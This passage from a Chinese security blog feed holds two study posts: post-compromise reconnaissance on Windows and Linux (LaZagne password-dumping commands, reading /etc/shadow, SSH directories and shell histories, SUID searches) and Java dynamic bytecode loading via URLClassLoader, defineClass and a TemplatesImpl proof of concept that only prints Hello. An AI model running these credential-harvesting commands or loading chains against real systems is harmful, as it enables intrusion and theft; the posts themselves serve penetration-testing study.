title="SecureCRT"></a>SecureCRT</h5><p><img src="https://bu.dusays.com/2024/10/11/670926505dd7a.png" alt="image-20240819180131406"></p><h5 id="Xshell"><a href="#Xshell" class="headerlink" title="Xshell"></a>Xshell</h5><p><img src="https://bu.dusays.com/2024/10/11/67092651ccf39.png" alt="image-20240819180147126"></p><h5 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h5><p><img src="https://bu.dusays.com/2024/10/11/67092653907ed.png" alt="image-20240819180202863"></p><h4 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h4><h5 id="wmic-info"><a href="#wmic-info" class="headerlink" title="wmic_info"></a>wmic_info</h5><p><a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar">wmic_info</a></p><p>把这个软件上传到目标主机</p><p>该脚本可以在目标机器上面完成服务。用户列表，用户组、网络接口、硬件信息、网络共享信息、操作系统、安装的补丁、安装的软件、自启程序、时区等信息的查询工作。其利用WMIC来收集信息。执行脚本后,会将所有结果写入一个HTML文件</p><p>解压文件之后得到一个bat文件，双击运行之后会得到一个html格式的文件，打开即可</p><h5 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h5><p><a href="https://github.com/samratashok/nishang">nishang</a></p><p>功能很全 但是要权限</p><p>教程：<a href="https://blog.csdn.net/weixin_40412037/article/details/115510209">https://blog.csdn.net/weixin_40412037/article/details/115510209</a></p><p>get-executionpolicy  查看执行权限</p><p>Restricted:默认设置，不允许执行任何脚本<br>Allsigned:只能运行经过证书验证的脚本<br>Unrestricted:权限最高，可以执行任意脚本<br>RemoteSigned:对本地脚本不进行限制；对来自网络的脚本必须验证其签名</p><p>set-executionpolicy Unrestricted  修改执行权限</p><p>import-module .\nishang.psm1导入模块</p><p>Invoke-PortScan -StartAddress 192.168.10.133 -EndAddress 192.168.10.255 -ResolveHost -ScanPort  带参数扫描</p><h5 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h5><p><a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></p><p>执行可以抓密码</p><blockquote><p>用法</p><ul><li>Launch all modules</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">laZagne.exe all</span><br></pre></td></tr></table></figure><p>​    </p><ul><li>Launch only a specific module</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">laZagne.exe browsers</span><br></pre></td></tr></table></figure><p>​    </p><ul><li>Launch only a specific software script</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">laZagne.exe browsers -firefox</span><br></pre></td></tr></table></figure><p>​    </p><ul><li>Write all passwords found into a file (-oN for Normal txt, -oJ for Json, -oA for All). Note: If you have problems to parse JSON results written as a multi-line strings, check <a href="https://github.com/AlessandroZ/LaZagne/issues/226">this</a>.</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">laZagne.exe all -oN</span><br><span class="line">laZagne.exe all -oA -output C:\Users\test\Desktop</span><br></pre></td></tr></table></figure><p>​    </p><ul><li>Get help</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">laZagne.exe -h</span><br><span class="line">laZagne.exe browsers -h</span><br></pre></td></tr></table></figure><p>​    </p><ul><li>Change verbosity mode (2 different levels)</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">laZagne.exe all -vv</span><br></pre></td></tr></table></figure><p>​    </p><ul><li>Quiet mode (nothing will be printed on the standard output)</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">laZagne.exe all -quiet -oA</span><br></pre></td></tr></table></figure><p>​    </p><ul><li>To decrypt domain credentials, it could be done specifying the user  windows password. Otherwise it will try all passwords already found as  windows passwords.</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">laZagne.exe all -password ZapataVive</span><br></pre></td></tr></table></figure><p>​    </p><p><strong>Note: For wifi passwords \ Windows Secrets, launch it with administrator privileges (UAC Authentication &#x2F; sudo)</strong></p></blockquote><h3 id="Linux信息收集"><a href="#Linux信息收集" class="headerlink" title="Linux信息收集"></a>Linux信息收集</h3><p> 我们在获取到webshell之后，经常会遇到Linux的操作系统，这是我们需要对Linux系统本地的敏感资源进行信息收集，下面就是一些有用的信息获取方式。</p><h4 id="获取内核，操作系统和设备信息"><a href="#获取内核，操作系统和设备信息" class="headerlink" title="获取内核，操作系统和设备信息"></a>获取内核，操作系统和设备信息</h4><p> uname -a #打印所有可用的系统信息</p><p> uname -r #内核版本信息</p><p> uname -n #系统主机名字</p><p> hostname #主机名</p><p> uname -m #Linux内核架构（x86&#x2F;x64）</p><p> cat &#x2F;proc&#x2F;version #内核信息</p><p> cat &#x2F;etc&#x2F;*-release #发布信息</p><p> cat &#x2F;etc&#x2F;issue #发布信息</p><p> cat &#x2F;proc&#x2F;cpuinfo #CPU信息</p><p> df -a #文件系统信息</p><h4 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h4><p>cat &#x2F;etc&#x2F;passwd 列出系统所有用户</p><p>cat &#x2F;etc&#x2F;group 列出系统所有组</p><p>cat &#x2F;etc&#x2F;shadow 列出所有用户hash（需要root权限）</p><p>users 当前登录的用户</p><p>who -a 当前登录的用户</p><p>w 显示目前登入系统的用户有那些人，以及他们正在执行的程序</p><p>last 显示登入过的用户信息</p><p>lastlog 显示系统中所有用户最近一次登录信息</p><p>lastlog  显示指定用户最后一次登入信息</p><h4 id="用户和权限信息"><a href="#用户和权限信息" class="headerlink" title="用户和权限信息"></a>用户和权限信息</h4><p>whoami 当前用户</p><p>id 当前用户信息</p><p>cat &#x2F;etc&#x2F;sudoers 可以使用sudo提升到root的用户（需要root权限）</p><p>sudo 允许普通用户执行一些或者全部的root命令的一个工具</p><p>sudo -l 列出目前用户可执行与无法执行的指令</p><p>su 切换当前用户身份到其他用户身份</p><h4 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h4><p>env 打印系统环境信息</p><p>set 打印系统环境信息</p><p>echo $PATH 环境变量中的路径信息</p><p>history 打印历史命令</p><p>pwd 显示当前路径</p><p>cat &#x2F;etc&#x2F;profile 显示默认系统遍历</p><p>cat &#x2F;etc&#x2F;shells 显示可用的shell</p><h4 id="有用的命令"><a href="#有用的命令" class="headerlink" title="有用的命令"></a>有用的命令</h4><p>find &#x2F; -perm -4000 -type f 查找SUID的文件</p><p>find &#x2F; -uid 0 -perm -4000 -type f 查找root权限的SUID文件</p><p>find &#x2F; -perm -2 -type f 找出可写的文件</p><p>find &#x2F; ! -path “&#x2F;proc&#x2F;“ -perm -2 -type f -print 查找&#x2F;proc以外的可写文件</p><p>find &#x2F; -perm -2 -type d 找出可写目录</p><p>find &#x2F;home –name *.rhosts -print 查找rhosts的配置文件</p><p>find &#x2F;home -iname *.plan -exec ls -la {} ; -exec cat {} 查询文件并打印</p><p>ls -ahlR &#x2F;root&#x2F; 查看是否有权限列用户目录</p><p>cat ~&#x2F;.bash_history 查看当前用户的历史记录</p><p>ls -la ~&#x2F;.*_history 查看当前用户的各种历史记录</p><p>ls -la ~&#x2F;.ssh&#x2F; 查看用户ssh登录信息</p><p>ls -la &#x2F;usr&#x2F;sbin&#x2F;in.* 检查inetd服务的配置</p><p>grep -l -i pass &#x2F;var&#x2F;log&#x2F;*.log 查询包含pass的日志并打印匹配到的行</p><p>ls -la &#x2F;etc&#x2F;*.conf 列出&#x2F;etc&#x2F;下的所有配置文件</p><p>lsof -i -n 列出打开的文件</p><p>head &#x2F;var&#x2F;mail&#x2F;root 答应&#x2F;var&#x2F;mail&#x2F;root的开头</p><h4 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h4><p>ps aux 查看进程信息</p><p>cat &#x2F;etc&#x2F;inetd.conf 由inetd管理的服务列表</p><p>cat &#x2F;etc&#x2F;xinetd.conf 由xinetd管理的服务列表</p><p>cat &#x2F;etc&#x2F;exports nfs服务器的配置</p><h4 id="作业和任务"><a href="#作业和任务" class="headerlink" title="作业和任务"></a>作业和任务</h4><p>crontab -l -u %username% 显示指定用户的计划作业（需要root权限）</p><p>ls -la &#x2F;etc&#x2F;cron* 计划任务</p><p>top 列出当前进程</p><h4 id="网络、路由和通信"><a href="#网络、路由和通信" class="headerlink" title="网络、路由和通信"></a>网络、路由和通信</h4><p>&#x2F;sbin&#x2F;ifconfig -a 列出网络接口信息</p><p>cat &#x2F;etc&#x2F;network&#x2F;interfaces 列出网络接口信息</p><p>arp -a 查看系统arp表</p><p>route 打印如有信息</p><p>cat &#x2F;etc&#x2F;resolv.conf 查看dns配置信息</p><p>netstat -an 打印本地端口开放信息</p><p>iptables -L 列出iptable的配置规则</p><p>cat &#x2F;etc&#x2F;services 查看端口服务映射</p><h4 id="软件信息"><a href="#软件信息" class="headerlink" title="软件信息"></a>软件信息</h4><p>dpkg -l 软件安装（Debian）</p><p>rpm -qa 软件安装（Red Hat</p><p>sudo -V 查看sudo的版本信息</p><p>httpd -v 查看apache的版本信息</p><p>apache2 -v 查看apache的版本信息</p><p>apache2ctl (or apachectl) -M 列出加载的apache模块</p><p>mysql –version mysql的版本信息</p><p>psql -V Postgres数据库的版本信息</p><p>perl -v perl的版本信息</p><p>java -version java的版本信息</p><p>python –version python的版本信息</p><p>ruby -v ruby的版本信息</p><p>find &#x2F; -name %program_name% 查找有用的软件</p><p>which %program_name% 查找有用的软件</p><p>cat &#x2F;etc&#x2F;apache2&#x2F;envvars 查看运行apache的帐号</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 内网 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA加载字节码</title>
      <link href="/2024/06/07/JAVA%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
      <url>/2024/06/07/JAVA%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA–加载字节码"><a href="#JAVA–加载字节码" class="headerlink" title="JAVA–加载字节码"></a>JAVA–加载字节码</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p><strong>定义：</strong></p><blockquote><p>Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储 在.class文件中。</p></blockquote><p>众所周知，不同平台、不同CPU的计算机指令有差异，但因为Java是一门跨平台的编译型语言，所以这 些差异对于上层开发者来说是透明的，上层开发者只需要将自己的代码编译一次，即可运行在不同平台 的JVM虚拟机中。<strong>只要你的编译器能够将代码编译成.class文件，都可以在JVM虚拟机中运行</strong>(甚至可以用Scala、Kotlin这样的语言编写代码)</p><p><img src="https://bu.dusays.com/2024/06/07/66630c1ccd073.png" alt="image-20240531114228815"></p><p>但是后文想说的字节码是广义”字节码”而不是狭义的“Java字节 码”：所有能够恢复成一个类并在JVM虚拟机里加 载的字节序列，都在我们的探讨范围内</p><h2 id="Java中动态加载字节码的方法"><a href="#Java中动态加载字节码的方法" class="headerlink" title="Java中动态加载字节码的方法"></a>Java中动态加载字节码的方法</h2><h3 id="利用URLClassLoader加载远程class文件"><a href="#利用URLClassLoader加载远程class文件" class="headerlink" title="利用URLClassLoader加载远程class文件"></a>利用URLClassLoader加载远程class文件</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        URL[] urls = &#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost:8000/&quot;</span>)&#125;;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> URLClassLoader.newInstance(urls);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> loader.loadClass(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">        c.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码如上</p><p>我们来具体分析一下</p><p>Java的ClassLoader来用来加载字节码文件最基础的方法</p><p>在反射那里有提到过</p><p>这里再补充一下：</p><blockquote><p><code>ClassLoader</code>是Java中一个负责动态加载类的抽象类。它是Java应用程序动态扩展其功能的关键机制。当Java虚拟机（JVM）需要某个类时，它会调用适当的<code>ClassLoader</code>实例来加载这个类的字节码文件（<code>.class</code>文件）到内存中，并创建对应的<code>Class</code>对象，之后该类就可以被实例化和使用了</p></blockquote><p>这里要说的是：</p><p>ClassLoader.SecureClassLoader.URLClassLoader</p><p>他们三个是继承关系</p><p><code>URLClassLoader</code>扩展了类加载的能力，使得可以从一个或多个指定的URL（统一资源定位符）中加载类和资源。这意味着，除了类路径（classpath）上的资源，<code>URLClassLoader</code>还可以从网络、文件系统中的特定位置、jar文件等加载类，提供了更为灵活的类加载方式。</p><p>URLClassLoader 实际上是我们平时默认使用的 AppClassLoader 的父类，所以，我们解释 URLClassLoader 的工作过程实际上就是在解释默认的Java类加载器的工作流程。</p><p>正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径(这些路径是经过处理后的 java.net.URL 类)来寻找.class文件来加载，而这个基础路径有分为三种情况：</p><blockquote><ul><li>URL未以斜杠 &#x2F; 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻 找.class文件 </li><li>URL以斜杠 &#x2F; 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻 找.class文件 </li><li>URL以斜杠 &#x2F; 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类</li></ul></blockquote><p>我们正常开发的时候通常遇到的是前两者，那什么时候才会出现使用 Loader 寻找类的情况呢？当然是非 file 协议的情况下，最常见的就是 http 协议</p><p>而 刚刚我给出的代码就是用来测试Java是否能从远程HTTP服务器上加载.class文件（用<code>Loader</code>寻找类）</p><p><img src="https://bu.dusays.com/2024/06/07/66630c1d05f60.png" alt="image-20240531132210078"></p><p>成功请求到我们的 &#x2F;Hello.class 文件，并执行了文件里的字节码，输出了”Hello World”。</p><p>所以，作为攻击者，如果<strong>我们能够控制目标Java ClassLoader的基础路径为一个http服务器，则可以利 用远程加载的方式执行任意代码了</strong>。</p><h3 id="利用ClassLoader-defineClass直接加载字节码"><a href="#利用ClassLoader-defineClass直接加载字节码" class="headerlink" title="利用ClassLoader.defineClass直接加载字节码"></a>利用ClassLoader.defineClass直接加载字节码</h3><p>首先我们要知道：不管是加载远程class文件，还是本地的class或jar文件，Java都经历的是下面这三个方法调用</p><p><img src="https://bu.dusays.com/2024/06/07/66630c1cbf66d.png" alt="image-20240531221616983"></p><p>理解：</p><ul><li><code>loadClass</code> 的作用是从已加载的类缓存、父加载器等位置<strong>寻找类</strong>（这里实际上是<strong>双亲委派机制</strong>），在前面没有找到的情况下，执行 <code>findClass</code> </li><li><code>findClass</code> 的作用是根据基础URL指定的方式来<strong>加载类的字节码</strong>，就像之前中说到的，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给 <code>defineClass</code> </li><li><code>defineClass</code> 的作用是处理前面传入的字节码，将其<strong>处理成真正的Java类</strong></li></ul><p>所以真正核心的部分其实是 <strong>defineClass</strong>–&gt;它决定了如何将一段字节流转变成一个Java类</p><p>Java 默认的 ClassLoader.defineClass 是一个native方法，逻辑在JVM的C语言代码中</p><p>写一段代码让系统的 <code>defineClass</code> 来直接加载字节码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloDefineClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(</span><br><span class="line">                <span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineClassMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(</span><br><span class="line">                <span class="string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">hello</span> <span class="operator">=</span> (Class) defineClassMethod.invoke(</span><br><span class="line">                ClassLoader.getSystemClassLoader(), <span class="string">&quot;Hello&quot;</span>, code, <span class="number">0</span>, code.length);</span><br><span class="line">        helloClass.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEA</span><br><span class="line">Bjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVs</span><br><span class="line">bG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZh</span><br><span class="line">L2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3Ry</span><br><span class="line">ZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5n</span><br><span class="line">OylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoA</span><br><span class="line">AAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM</span><br><span class="line">解码：</span><br><span class="line">是一个Java字节码</span><br><span class="line">定义了一个名为Hello的类，其中包含一个默认构造函数和一个main方法。main方法内仅有一行代码，用于向标准输出打印字符串Hello World。这是学习Java字节码或动态加载类时常会见到的示例。</span><br></pre></td></tr></table></figure><p>在 defineClass 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造函数，初始化代码才能被执行</p><p>并且，即使我们将初始化代码放在类的static块中,在 defineClass 时也无法被直接调用到。</p><p>所以，如果我们要使用 defineClass 在目标机器上执行任意代码，需要<strong>想办法调用构造函数</strong>。</p><p><img src="https://bu.dusays.com/2024/06/07/66630c1d0af84.png" alt="image-20240531223835960"></p><p>以上代码输出了hello world</p><p>这里，因为系统的 ClassLoader#defineClass 是一个保护属性，所以我们无法直接在外部访问，不得 不使用<strong>反射</strong>的形式来调用。 </p><p>在实际场景中，因为defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我 们常用的一个攻击链 <code>TemplatesImpl</code> 的基石。</p><h3 id="利用TemplatesImpl加载字节码"><a href="#利用TemplatesImpl加载字节码" class="headerlink" title="利用TemplatesImpl加载字节码"></a>利用TemplatesImpl加载字节码</h3><p>如上面所说</p><p>虽然大部分上层开发者不会直接使用到defineClass方法，但是Java底层还是有一些类用到了它（否则他 也没存在的价值了对吧），这就是 <strong>TemplatesImpl</strong></p><p>我们看下源码</p><p><code>src.com.sun.org.apache.xalan.internal.xsltc.trax.trax.TemplatesImpl</code> 这个类中定义了一个内部类 <strong>TransletClassLoader</strong></p><p><img src="https://bu.dusays.com/2024/06/07/66630c1ce2750.png" alt="image-20240531225005470"></p><p>这个类里重写了 defineClass 方法，并且这里没有显式地声明其定义域。</p><p>Java中默认情况下，如果一个方法没有显式声明作用域，其作用域为<strong>default</strong>。</p><p>所以也就是说这里的 defineClass 由其父类的 protected类型变成了一个default类型的方法，<strong>可以被类外部调用</strong>。</p><p>我们从 TransletClassLoader.defineClass() 向前追溯一下调用链：**(ctrl+alt+H)**</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties() -&gt; TemplatesImpl.newTransformer() -&gt;</span><br><span class="line">TemplatesImpl.getTransletInstance() -&gt; TemplatesImpl.defineTransletClasses()</span><br><span class="line">-&gt; TransletClassLoader.defineClass()</span><br></pre></td></tr></table></figure><p>追到最前面两个方法 <code>TemplatesImpl.getOutputProperties()</code> 、 <code>TemplatesImpl.newTransformer()</code> ，这两者的作用域是<strong>public</strong>，可以被外部调用。我们尝试用 newTransformer() 构造一个简单的POC：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// source: bytecodes/HelloTemplateImpl.java</span></span><br><span class="line">    <span class="type">byte</span>[] code = Base64.getDecoder().decode(</span><br><span class="line">        <span class="string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    TemplatesImpl obj = new TemplatesImpl();</span></span><br><span class="line"><span class="string">    setFieldValue(obj, &quot;</span>_bytecodes<span class="string">&quot;, new byte[][] &#123; code &#125;);</span></span><br><span class="line"><span class="string">    setFieldValue(obj, &quot;</span>_name<span class="string">&quot;, &quot;</span>HelloTemplatesImpl<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    TransformerFactoryImpl tfactory = new TransformerFactoryImpl();</span></span><br><span class="line"><span class="string">    setFieldValue(obj, &quot;</span>_tfactory<span class="string">&quot;, tfactory);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    obj.newTransformer();</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>其中， setFieldValue 方法用来设置私有属性，可见，这里我设置了三个属性： <code>_bytecodes</code> 、 <code>_name</code> 和 <code>_tfactory</code> 。</p><ul><li><p><code>_bytecodes</code> 是由字节码组成的数组； </p></li><li><p><code>_name</code> 可以是任意字符串，只要不为null即可； </p></li><li><p><code>_tfactory</code> 需要是一个 TransformerFactoryImpl 对象，因为TemplatesImpl#defineTransletClasses() 方法里有调用到_tfactory.getExternalExtensionsMap() ，如果是null会出错。</p></li></ul><p>base64解码也是字节码文件的编码</p><p>另外，值得注意的是，TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须是 <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> 的<strong>子类</strong>。</p><p>所以 这里我们写一个特殊的类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span></span><br><span class="line">            <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">        <span class="comment">// Implementation, if needed</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator,</span></span><br><span class="line"><span class="params">                         SerializationHandler handler)</span></span><br><span class="line">            <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">        <span class="comment">// Implementation, if needed</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HelloTemplatesImpl</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello TemplatesImpl&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它继承了 AbstractTranslet 类，并在构造函数里插入Hello的输出。将其编译成字节码，即可被 TemplatesImpl 执行了：</p><p><img src="https://bu.dusays.com/2024/06/07/66630c1d69180.png" alt="image-20240531231840577"></p><h3 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h3><p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为 被Apache Xalan所使用，而Apache Xalan又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的 原生库中</p><p><a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">详解</a></p><p>我们可以通过BCEL提供的两个类 <code>Repository</code> 和 <code>Utility</code> 来利用： </p><ul><li>Repository 用于将一个Java Class 先转换成原生字节码，当然这里也可以直接使用javac命令来编译java文件生成字节码； </li><li>Utility 用于将原生的字节码转换成BCEL格式的字节码：</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.govuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloBCEL</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span 